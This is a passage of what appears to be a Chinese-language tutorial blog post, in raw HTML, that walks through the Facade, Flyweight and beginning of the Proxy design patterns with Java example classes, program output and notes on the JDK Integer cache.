&#123;<br>      System.out.println(<span class="hljs-string">&quot; Screen down &quot;</span>);<br>   &#125;<br>   <br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>TheaterLight</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.facade;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TheaterLight</span> &#123;<br><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">TheaterLight</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TheaterLight</span>();<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> TheaterLight <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> instance;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">on</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; TheaterLight on &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">off</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; TheaterLight off &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dim</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; TheaterLight dim.. &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">bright</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; TheaterLight bright.. &quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.facade;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">// TODO Auto-generated method stub</span><br><span class="hljs-comment">//这里直接调用。。 很麻烦</span><br><span class="hljs-type">HomeTheaterFacade</span> <span class="hljs-variable">homeTheaterFacade</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HomeTheaterFacade</span>();<br>homeTheaterFacade.ready();<br>System.out.println(<span class="hljs-string">&quot;~~~~~~~~~~~~~&quot;</span>);<br>homeTheaterFacade.play();<br>System.out.println(<span class="hljs-string">&quot;~~~~~~~~~~~~~&quot;</span>);<br>homeTheaterFacade.end();<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code"> popcorn on </span><br><span class="hljs-code"> popcorn is poping  </span><br><span class="hljs-code"> Screen down </span><br><span class="hljs-code"> Projector on </span><br><span class="hljs-code"> Stereo on </span><br><span class="hljs-code"> dvd on </span><br><span class="hljs-section"> TheaterLight dim.. </span><br><span class="hljs-section">~~~~~~~~~~~~~</span><br><span class="hljs-section"> dvd is playing </span><br><span class="hljs-section">~~~~~~~~~~~~~</span><br><span class="hljs-code"> popcorn ff </span><br><span class="hljs-code"> TheaterLight bright.. </span><br><span class="hljs-code"> Screen up </span><br><span class="hljs-code"> Projector ff </span><br><span class="hljs-code"> Screen off </span><br><span class="hljs-code"> dvd off </span><br></code></pre></td></tr></table></figure><h2 id="外观模式的注意事项和细节"><a class="markdownIt-Anchor" href="#外观模式的注意事项和细节"></a> 外观模式的注意事项和细节</h2><ol><li>外观模式对外屏蔽了子系统的细节，因此外观模式降低了客户端对子系统使用的复杂性</li><li>外观模式对客户端与子系统的耦合关系 - 解耦，让子系统内部的模块更易维护和扩展</li><li>通过合理的使用外观模式，可以帮我们更好的划分访问的层次</li><li>当系统需要进行分层设计时，可以考虑使用 Facade 模式</li><li>在维护一个遗留的大型系统时，可能这个系统已经变得非常难以维护和扩展，此时可以考虑为新系统开发一个Facade 类，来提供遗留系统的比较清晰简单的接口，让新系统与 Facade 类交互，提高复用性。</li><li>不能过多的或者不合理的使用外观模式，使用外观模式好，还是直接调用模块好。要以让系统有层次，利于维护为目的。</li></ol><h1 id="享元模式"><a class="markdownIt-Anchor" href="#享元模式"></a> 享元模式</h1><p>享元模式（FlyweightPattern）也叫 蝇量模式主要用于减少创建对象的数量，以减少内存占用和提高性能。这种类型的设计模式属于结构型模式，它提供了减少对象数量从而改善应用所需的对象结构的方式。</p><p>享元模式尝试重用现有的同类对象，如果未找到匹配的对象，则创建新对象。我们将通过创建 5 个对象来画出 20 个分布于不同位置的圆来演示这种模式。由于只有 5种可用的颜色，所以 color 属性被用来检查现有的 <em>Circle</em> 对象。</p><h2 id="介绍-10"><a class="markdownIt-Anchor" href="#介绍-10"></a> 介绍</h2><p><strong>意图：</strong> 运用共享技术有效地支持大量细粒度的对象。</p><p><strong>主要解决：</strong> 在有大量对象时，有可能会造成内存溢出，我们把其中共同的部分抽象出来，如果有相同的业务请求，直接返回在内存中已有的对象，避免重新创建。</p><p><strong>何时使用：</strong> 1、系统中有大量对象。 2、这些对象消耗大量内存。 3、这些对象的状态大部分可以外部化。4、这些对象可以按照内蕴状态分为很多组，当把外蕴对象从对象中剔除出来时，每一组对象都可以用一个对象来代替。5、系统不依赖于这些对象身份，这些对象是不可分辨的。</p><p><strong>如何解决：</strong> 用唯一标识码判断，如果在内存中有，则返回这个唯一标识码所标识的对象。</p><p><strong>关键代码：</strong> 用 HashMap 存储这些对象。</p><p><strong>应用实例：</strong> 1、JAVA 中的 String，如果有则返回，如果没有则创建一个字符串保存在字符串缓存池里面。 2、数据库的数据池。</p><p><strong>优点：</strong> 大大减少对象的创建，降低系统的内存，使效率提高。</p><p><strong>缺点：</strong> 提高了系统的复杂度，需要分离出外部状态和内部状态，而且外部状态具有固有化的性质，不应该随着内部状态的变化而变化，否则会造成系统的混乱。</p><p><strong>使用场景：</strong> 1、系统有大量相似对象。 2、需要缓冲池的场景。</p><p><strong>注意事项：</strong> 1、注意划分外部状态和内部状态，否则可能会引起线程安全问题。 2、这些类必须有一个工厂对象加以控制。</p><p><strong>享元模式的原理类图：</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103100919853.png" alt="image-20230103100919853" /></p><p>对原理图的说明-即(模式的角色及职责)</p><ol><li><p>FlyWeight 是抽象的享元角色, 他是产品的抽象类, 同时定义出对象的外部状态和内部状态(后面介绍) 的接口或实现</p></li><li><p>ConcreteFlyWeight 是具体的享元角色，是具体的产品类，实现抽象角色定义相关业务</p></li><li><p>UnSharedConcreteFlyWeight 是不可共享的角色，一般不会出现在享元工厂。</p></li><li><p>FlyWeightFactory 享元工厂类，用于构建一个池容器(集合)， 同时提供从池中获取对象方法</p></li></ol><h2 id="实现-8"><a class="markdownIt-Anchor" href="#实现-8"></a> 实现</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103110105715.png" alt="image-20230103110105715" /></p><p><code>WebSite</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.flyweight;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebSite</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">use</span><span class="hljs-params">(User user)</span>;<span class="hljs-comment">//抽象方法</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * //共享方法</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@author</span> 席子</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showMe</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;欢迎使用xtwoy系统&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ConcreteWebSite</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.flyweight;<br><br><span class="hljs-comment">//具体网站</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcreteWebSite</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSite</span> &#123;<br><br>   <span class="hljs-comment">//共享的部分，内部状态</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">//网站发布的形式(类型)</span><br><br>   <br>   <span class="hljs-comment">//构造器</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">ConcreteWebSite</span><span class="hljs-params">(String type)</span> &#123;<br>      <br>      <span class="hljs-built_in">this</span>.type = type;<br>   &#125;<br><br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">use</span><span class="hljs-params">(User user)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      showMe();<br>      System.out.println(<span class="hljs-string">&quot;网站的发布形式为:&quot;</span> + type + <span class="hljs-string">&quot; 在使用中 .. 使用者是&quot;</span> + user.getName());<br>   &#125;<br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>WebSiteFactory</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.flyweight;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-comment">// 网站工厂类，根据需要返回压一个网站</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebSiteFactory</span> &#123;<br><br>   <br>   <span class="hljs-comment">//集合， 充当池的作用</span><br>   <span class="hljs-keyword">private</span> HashMap&lt;String, ConcreteWebSite&gt; pool = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>   <br>   <span class="hljs-comment">//根据网站的类型，返回一个网站, 如果没有就创建一个网站，并放入到池中,并返回</span><br>   <span class="hljs-keyword">public</span> WebSite <span class="hljs-title function_">getWebSiteCategory</span><span class="hljs-params">(String type)</span> &#123;<br>      <span class="hljs-keyword">if</span>(!pool.containsKey(type)) &#123;<br>         <span class="hljs-comment">//就创建一个网站，并放入到池中</span><br>         pool.put(type, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcreteWebSite</span>(type));<br>      &#125;<br>      <br>      <span class="hljs-keyword">return</span> (WebSite)pool.get(type);<br>   &#125;<br>   <br>   <span class="hljs-comment">//获取网站分类的总数 (池中有多少个网站类型)</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getWebSiteCount</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> pool.size();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>User</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.flyweight;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>   <br>   <span class="hljs-keyword">private</span> String name;<br><br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name)</span> &#123;<br>      <span class="hljs-built_in">super</span>();<br>      <span class="hljs-built_in">this</span>.name = name;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> name;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>      <span class="hljs-built_in">this</span>.name = name;<br>   &#125;<br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.flyweight;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br><br>      <span class="hljs-comment">// 创建一个工厂类</span><br>      <span class="hljs-type">WebSiteFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSiteFactory</span>();<br><br>      <span class="hljs-comment">// 客户要一个以新闻形式发布的网站</span><br>      <span class="hljs-type">WebSite</span> <span class="hljs-variable">webSite1</span> <span class="hljs-operator">=</span> factory.getWebSiteCategory(<span class="hljs-string">&quot;新闻&quot;</span>);<br><br>      <br>      webSite1.use(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;tom&quot;</span>));<br><br>      <span class="hljs-comment">// 客户要一个以博客形式发布的网站</span><br>      <span class="hljs-type">WebSite</span> <span class="hljs-variable">webSite2</span> <span class="hljs-operator">=</span> factory.getWebSiteCategory(<span class="hljs-string">&quot;博客&quot;</span>);<br><br>      webSite2.use(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;jack&quot;</span>));<br><br>      <span class="hljs-comment">// 客户要一个以博客形式发布的网站</span><br>      <span class="hljs-type">WebSite</span> <span class="hljs-variable">webSite3</span> <span class="hljs-operator">=</span> factory.getWebSiteCategory(<span class="hljs-string">&quot;博客&quot;</span>);<br><br>      webSite3.use(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;smith&quot;</span>));<br><br>      <span class="hljs-comment">// 客户要一个以博客形式发布的网站</span><br>      <span class="hljs-type">WebSite</span> <span class="hljs-variable">webSite4</span> <span class="hljs-operator">=</span> factory.getWebSiteCategory(<span class="hljs-string">&quot;博客&quot;</span>);<br><br>      webSite4.use(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;king&quot;</span>));<br>      <br>      System.out.println(<span class="hljs-string">&quot;网站的分类共=&quot;</span> + factory.getWebSiteCount());<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">欢迎使用xtwoy系统<br>网站的发布形式为:新闻 在使用中 <span class="hljs-string">..</span> 使用者是tom<br>欢迎使用xtwoy系统<br>网站的发布形式为:博客 在使用中 <span class="hljs-string">..</span> 使用者是jack<br>欢迎使用xtwoy系统<br>网站的发布形式为:博客 在使用中 <span class="hljs-string">..</span> 使用者是smith<br>欢迎使用xtwoy系统<br>网站的发布形式为:博客 在使用中 <span class="hljs-string">..</span> 使用者是king<br>网站的分类共=2<br></code></pre></td></tr></table></figure><h2 id="享元模式在-jdk-interger-的应用源码分析"><a class="markdownIt-Anchor" href="#享元模式在-jdk-interger-的应用源码分析"></a> 享元模式在 JDK-Interger 的应用源码分析</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.atguigu.jdk;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FlyWeight</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//如果 Integer.valueOf(x) x 在  -128 --- 127 直接，就是使用享元模式返回,如果不在</span><br>      <span class="hljs-comment">//范围类，则仍然 new </span><br>      <br>      <span class="hljs-comment">//小结:</span><br>      <span class="hljs-comment">//1. 在valueOf 方法中，先判断值是否在 IntegerCache 中，如果不在，就创建新的Integer(new), 否则，就直接从 缓存池返回</span><br>      <span class="hljs-comment">//2. valueOf 方法，就使用到享元模式</span><br>      <span class="hljs-comment">//3. 如果使用valueOf 方法得到一个Integer 实例，范围在 -128 - 127 ，执行速度比 new 快</span><br>      <br>      <br>      <span class="hljs-type">Integer</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> Integer.valueOf(<span class="hljs-number">127</span>); <span class="hljs-comment">// 得到 x实例，类型 Integer</span><br>      <span class="hljs-type">Integer</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">127</span>); <span class="hljs-comment">// 得到 y 实例，类型 Integer</span><br>      <span class="hljs-type">Integer</span> <span class="hljs-variable">z</span> <span class="hljs-operator">=</span> Integer.valueOf(<span class="hljs-number">127</span>);<span class="hljs-comment">//..</span><br>      <span class="hljs-type">Integer</span> <span class="hljs-variable">w</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">127</span>);<br>      <br>      <br>      System.out.println(x.equals(y)); <span class="hljs-comment">// 大小，true</span><br>      System.out.println(x == y ); <span class="hljs-comment">//  false</span><br>      System.out.println(x == z ); <span class="hljs-comment">// true</span><br>      System.out.println(w == x ); <span class="hljs-comment">// false</span><br>      System.out.println(w == y ); <span class="hljs-comment">// false</span><br>      <br>      <br>      <span class="hljs-type">Integer</span> <span class="hljs-variable">x1</span> <span class="hljs-operator">=</span> Integer.valueOf(<span class="hljs-number">200</span>);<br>      <span class="hljs-type">Integer</span> <span class="hljs-variable">x2</span> <span class="hljs-operator">=</span> Integer.valueOf(<span class="hljs-number">200</span>);<br>      System.out.println(<span class="hljs-string">&quot;x1==x2&quot;</span> + (x1 == x2)); <span class="hljs-comment">// false</span><br><br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103111534525.png" alt="image-20230103111534525" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103111520047.png" alt="image-20230103111516626" /></p><h2 id="享元模式的注意事项和细节"><a class="markdownIt-Anchor" href="#享元模式的注意事项和细节"></a> 享元模式的注意事项和细节</h2><ol><li><p>在享元模式这样理解，“享”就表示共享，“元”表示对象</p></li><li><p>系统中有大量对象，这些对象消耗大量内存，并且对象的状态大部分可以外部化时，我们就可以考虑选用享元模式</p></li><li><p>用唯一标识码判断，如果在内存中有，则返回这个唯一标识码所标识的对象，用 HashMap/HashTable 存储</p></li><li><p>享元模式大大减少了对象的创建，降低了程序内存的占用，提高效率</p></li><li><p>享元模式提高了<strong>系统的复杂度</strong>。需要分离出<strong>内部状态和外部状态</strong>，而外部状态具有固化特性，不应该随着内部状态的改变而改变，这是我们使用享元模式需要注意的地方.</p></li><li><p>使用享元模式时，注意划分内部状态和外部状态，并且需要有一个工厂类加以控制。</p></li><li><p>享元模式经典的应用场景是需要缓冲池的场景，比如 String 常量池、数据库连接池</p></li></ol><h1 id="代理模式"><a class="markdownIt-Anchor" href="#代理模式"></a> <mark>代理模式</mark></h1><p>在代理模式（Proxy Pattern）中，一个类代表另一个类的功能。这种类型的设计模式属于结构型模式。</p><p>在代理模式中，我们创建具有现有对象的对象，以便向外界提供功能接口。</p><h2 id="介绍-11"><a class="markdownIt-Anchor" href="#介绍-11"></a> 介绍</h2><p><strong>意图：</strong> 为其他对象提供一种代理以控制对这个对象的访问。</p><p><strong>主要解决：</strong><br />在直接访问对象时带来的问题，比如说：要访问的对象在远程的机器上。在面向对象系统中，有些对象由于某些原因（比如对象创建开销很大，或者某些操作需要安全控制，或者需要进程外的访问），直接访问会给使用者或者系统结构带来很多麻烦，我们可以在访问此对象时加上一个对此对象的访问层。</p><p><strong>何时使用：</strong> 想在访问一个类时做一些控制。</p><p><strong>如何解决：</strong> 增加中间层。</p><p><strong>关键代码：</strong> 实现与被代理类组合。</p><p><strong>应用实例：</strong> 1、Windows 里面的快捷方式。2、猪八戒去找高翠兰结果是孙悟空变的，可以这样理解：把高翠兰的外貌抽象出来，高翠兰本人和孙悟空都实现了这个接口，猪八戒访问高翠兰的时候看不出来这个是孙悟空，所以说孙悟空是高翠兰代理类。3、买火车票不一定在火车站买，也可以去代售点。 4、一张支票或银行存单是账户中资金的代理。支票在市场交易中用来代替现金，并提供对签发人账号上资金的控制。5、spring aop。</p><p><strong>优点：</strong> 1、职责清晰。 2、高扩展性。 3、智能化。</p><p><strong>缺点：</strong> 1、由于在客户端和真实主题之间增加了代理对象，因此有些类型的代理模式可能会造成请求的处理速度变慢。2、实现代理模式需要额外的工作，有些代理模式的实现非常复杂。</p><p><strong>使用场景：</strong> 按职责来划分，通常有以下使用场景： 1、远程代理。 2、虚拟代理。 3、Copy-on-Write 代理。 4、保护（Protector Access）代理。 5、Cache代理。 6、防火墙（Firewall）代理。 7、同步化（Synchronization）代理。8、智能引用（Smart Reference）代理。</p><p><strong>注意事项：</strong> 1、和适配器模式的区别：适配器模式主要改变所考虑对象的接口，而代理模式不能改变所代理类的接口。2、和装饰器模式的区别：装饰器模式为了增强功能，而代理模式是为了加以控制。</p><h2 id="实现-9"><a class="markdownIt-Anchor" href="#实现-9"></a> 实现</h2><h3 id="静态代理"><a class="markdownIt-Anchor" href="#静态代理"></a> 静态代理</h3><blockquote><p>静态代码模式的基本介绍</p></blockquote><p>静态代理在使用时,需要定义接口或者父类,被代理对象(即目标对象)与代理对象一起实现相同的接口或者是继承相同父类</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103144345369.png" alt="image-20230103144345369" /></p><p><code>ITeacherDao.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.staticproxy;<br><br><br><span class="hljs-comment">//接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ITeacherDao</span> &#123;<br>   <br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">teach</span><span class="hljs-params">()</span>; <span class="hljs-comment">// 授课的方法</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>TeacherDao.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.proxy.staticproxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TeacherDao</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ITeacherDao</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">teach</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 老师授课中  。。。。。&quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>TeacherDaoProxy.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 